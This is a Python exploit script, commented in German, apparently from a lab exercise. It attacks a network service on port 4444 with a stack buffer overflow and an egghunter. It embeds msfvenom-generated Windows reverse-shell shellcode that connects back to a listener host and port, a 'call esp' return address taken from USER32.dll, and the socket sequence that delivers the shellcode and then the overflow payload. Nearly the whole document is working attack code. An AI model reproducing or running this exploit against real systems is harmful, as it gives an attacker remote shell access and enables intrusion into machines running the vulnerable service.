import socket, sys
import struct
from time import sleep
ip = '10.134.164.189'
port = 4444

# reverseshell: msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.134.164.177 LPORT=9999 -f c -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"
shellcode = (
"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x4d\xfe\xf9\x1e\x83\xee\xfc\xe2\xf4\xb1\x16\x7b\x1e"
"\x4d\xfe\x99\x97\xa8\xcf\x39\x7a\xc6\xae\xc9\x95\x1f\xf2"
"\x72\x4c\x59\x75\x8b\x36\x42\x49\xb3\x38\x7c\x01\x55\x22"
"\x2c\x82\xfb\x32\x6d\x3f\x36\x13\x4c\x39\x1b\xec\x1f\xa9"
"\x72\x4c\x5d\x75\xb3\x22\xc6\xb2\xe8\x66\xae\xb6\xf8\xcf"
"\x1c\x75\xa0\x3e\x4c\x2d\x72\x57\x55\x1d\xc3\x57\xc6\xca"
"\x72\x1f\x9b\xcf\x06\xb2\x8c\x31\xf4\x1f\x8a\xc6\x19\x6b"
"\xbb\xfd\x84\xe6\x76\x83\xdd\x6b\xa9\xa6\x72\x46\x69\xff"
"\x2a\x78\xc6\xf2\xb2\x95\x15\xe2\xf8\xcd\xc6\xfa\x72\x1f"
"\x9d\x77\xbd\x3a\x69\xa5\xa2\x7f\x14\xa4\xa8\xe1\xad\xa1"
"\xa6\x44\xc6\xec\x12\x93\x10\x96\xca\x2c\x4d\xfe\x91\x69"
"\x3e\xcc\xa6\x4a\x25\xb2\x8e\x38\x4a\x01\x2c\xa6\xdd\xff"
"\xf9\x1e\x64\x3a\xad\x4e\x25\xd7\x79\x75\x4d\x01\x2c\x4e"
"\x1d\xae\xa9\x5e\x1d\xbe\xa9\x76\xa7\xf1\x26\xfe\xb2\x2b"
"\x6e\x74\x48\x96\xf3\x98\xe9\x4f\x91\x1c\x4d\xd9\xf6\x97"
"\xab\x94\xe9\x48\x1a\x96\x60\xbb\x39\x9f\x06\xcb\xc8\x3e"
"\x8d\x12\xb2\xb0\xf1\x6b\xa1\x96\x09\xab\xef\xa8\x06\xcb"
"\x25\x9d\x94\x7a\x4d\x77\x1a\x49\x1a\xa9\xc8\xe8\x27\xec"
"\xa0\x48\xaf\x03\x9f\xd9\x09\xda\xc5\x1f\x4c\x73\xbd\x3a"
"\x5d\x38\xf9\x5a\x19\xae\xaf\x48\x1b\xb8\xaf\x50\x1b\xa8"
"\xaa\x48\x25\x87\x35\x21\xcb\x01\x2c\x97\xad\xb0\xaf\x58"
"\xb2\xce\x91\x16\xca\xe3\x99\xe1\x98\x45\x09\xab\xef\xa8"
"\x91\xb8\xd8\x43\x64\xe1\x98\xc2\xff\x62\x47\x7e\x02\xfe"
"\x38\xfb\x42\x59\x5e\x8c\x96\x74\x4d\xad\x06\xcb")

#egghunter shellcode sucht nach "w00tw00t" --> !mona egg -t w00tw00t
egghunter = ""
egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

call_esp = 0x778846E4    #!mona jmp -r esp -m USER32.dll [findet ein "call esp"]

payload = "A"*40
payload += struct.pack("<I",call_esp) # wandle die call_esp Adresse in little endian Byteordnung
payload += egghunter

#************ Uebertragung des Shellcodes mit w00tw00t ******************
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))
sleep(1)
print s.recv(1024)
print "************************Shellcode wird Uebertragen************************"
s.send ('A\r\n') # waehle Funktion A aus
print s.recv(1024)
sleep(1)
s.send("1rgendwa51rgendwa5" + '\r\n') # sende 1rgendwa51rgendwa5 als Name
print s.recv(1024)
sleep(1)
s.send("w00tw00t" + shellcode + '\r\n') # sende w00tw00t und den Shellcode. Irgendwo im fuer das Programm reservierten Speicher steht "w00tw00t+Shellcode"
print s.recv(1024)
s.close()

#************** Uebertragung des Payloads = Padding + call esp + Egghunter******************
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))
sleep(1)
print "************************Payload wird uebertragen************************"
s.send('C\r\n') # waehle Funktion C aus
print s.recv(1024)
sleep(1)
s.send(payload + '\r\n') # sende den gesamten Payload
print s.recv(1024)
sleep(1)
s.send('y\r\n') # Fuzz
print s.recv(1024)
s.close()
